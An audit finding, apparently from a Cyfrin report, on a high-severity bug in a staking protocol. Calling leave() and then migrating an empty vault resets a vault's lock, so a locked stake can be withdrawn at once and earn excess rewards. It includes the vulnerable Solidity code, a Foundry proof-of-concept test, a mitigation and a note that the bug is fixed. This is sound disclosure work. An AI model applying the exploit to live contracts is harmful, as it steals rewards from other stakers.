---
tags:
  - lang/solidity
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - sector/staking
protocol: "[[Statusl]]"
auditors:
  - "[[Samuraii77]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-05-cyfrin-statusl2-v2.0.md"
genome:
  - "[[wrong-condition]]"
  - "[[indirect-loss]]"
  - "[[reward-accounting]]"
---
# User can bypass lock and withdraw stake anytime

- id: 65328
- impact: HIGH
- protocol: [[Statusl]]
- reporter: Samuraii77 (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-05-cyfrin-statusl2-v2.0.md

## Summary


The bug report describes a scenario where a user can exploit the system by staking tokens for a short period of time and then migrating to a new vault, allowing them to withdraw their stake immediately without any penalties. This gives them an unfair advantage and allows them to earn more rewards than other users. The report provides a proof of concept and recommends a mitigation to prevent this exploit. The bug has been fixed in the code and has been verified by a third party.

## Details

**Description:** Attack scenario is following:
1) User staked with lock, let's say 1000 tokens for 4 years
2) User registers new vault
3) User calls `StakeVault::leave` on locked vault. It sets `vault.stakedBalance = 0` and resets other values:
```solidity
    function leave() external whenNotPaused onlyTrustedCodehash {
        _updateGlobalState();
        _updateVault(msg.sender, false);

        VaultData storage vault = vaultData[msg.sender];

        if (vault.stakedBalance > 0) {
            // calling `_unstake` to update accounting accordingly
@>          _unstake(vault.stakedBalance, vault);
        }

        uint256 rewardsToRedeem = vault.rewardsAccrued;
        // reset accrued rewards
        totalRewardsAccrued -= rewardsToRedeem;
        vault.rewardsAccrued = 0;
        vault.rewardIndex = 0;
        // further cleanup that isn't done in `_unstake`
        vault.lastMPUpdateTime = 0;

        bool success = REWARD_TOKEN.transfer(IStakeVault(msg.sender).owner(), rewardsToRedeem);
        if (!success) {
            revert StakeManager__RewardTransferFailed();
        }
        emit VaultLeft(msg.sender);
    }
```
4) Migrate from new vault to locked. Checks will succeed. Finally it will reset `lockUntil` and `depositedBalance` to 0 in locked vault, which allows to withdraw immediately:
```solidity
    function migrateToVault(address migrateTo)
        external
        onlyNotEmergencyMode
        whenNotPaused
        onlyTrustedCodehash
        onlyRegisteredVault
    {
@>      if (vaultOwners[migrateTo] == address(0)) {
            revert StakeManager__InvalidVault();
        }

@>      if (vaultData[migrateTo].stakedBalance > 0) {
            revert StakeManager__MigrationTargetHasFunds();
        }

        ...

        IStakeVault.MigrationData memory migrationData = IStakeVault.MigrationData({
            lockUntil: IStakeVault(msg.sender).lockUntil(),
            depositedBalance: IStakeVault(msg.sender).depositedBalance()
        });

@>      IStakeVault(migrateTo).migrateFromVault(migrationData);

        delete vaultData[msg.sender];

        emit VaultMigrated(msg.sender, migrateTo);
    }

    function migrateFromVault(MigrationData calldata data) external {
        if (msg.sender != address(stakeManager)) {
            revert StakeVault__NotAuthorized();
        }
@>      lockUntil = data.lockUntil;
        depositedBalance = data.depositedBalance;
    }
```

**Impact:** Stake can be withdrawn anytime, therefore user can stake at max lock period without any downside. When user stakes without lock, he has `2X` shares earning rewards, however with this trick he has `6X` shares earning rewards - so user earns up to 3x more rewards, basically stealing reward from other users.

**Proof of Concept:** Insert this into `status-network-contracts/test/BypassLockViaMigration.t.sol`, execute with `forge test --match-test test_a -vv`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { StakeVault } from "../../src/StakeVault.sol";
import { StakeManagerTest } from "./StakeManagerBase.t.sol";
import { UpgradeStakeManagerScript } from "../../script/UpgradeStakeManager.s.sol";
import { console } from "forge-std/console.sol";

contract BypassLockViaMigrationTest is StakeManagerTest {
    function setUp() public virtual override {
        super.setUp();
    }

    function test_a() public {
        uint256 stakeAmount = 1000e18;
        uint256 lockPeriod = 4 * 365 days; // 4 years

        StakeVault lockedVault = StakeVault(vaults[alice]);

        vm.startPrank(alice);
        stakingToken.approve(address(lockedVault), stakeAmount);
        lockedVault.stake(stakeAmount, lockPeriod);
        vm.stopPrank();

        vm.prank(alice);
        StakeVault emptyVault = vaultFactory.createVault();

        vm.prank(alice);
        lockedVault.leave(alice);

        vm.prank(alice);
        emptyVault.migrateToVault(address(lockedVault));

        uint256 balanceBefore = stakingToken.balanceOf(alice);
        vm.prank(alice);
        lockedVault.withdraw(stakingToken, stakeAmount, alice);
        console.log("tokens withdrawn %e", stakingToken.balanceOf(alice) - balanceBefore);
    }
}

```

**Recommended Mitigation:** Possible mitigation is to disallow migrating to vault if `vault.hasLeft == true`.

**StatusL2:** Fixed in [fb6c8ef](https://github.com/status-im/status-network-monorepo/commit/fb6c8ef112477f831067edaf3abd3aa82b0503d9).

**Cyfrin:** Verified.
